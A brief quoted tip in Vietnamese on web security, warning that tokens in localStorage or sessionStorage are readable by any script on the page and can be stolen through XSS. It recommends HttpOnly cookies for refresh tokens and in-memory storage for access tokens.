> "localStorage/sessionStorage = KHÔNG có access control! Mọi JS trên page đều ĐỌC/GHI được! XSS = game over cho tokens trong storage! Luôn dùng HttpOnly Cookie cho refresh tokens và In-Memory cho access tokens!"
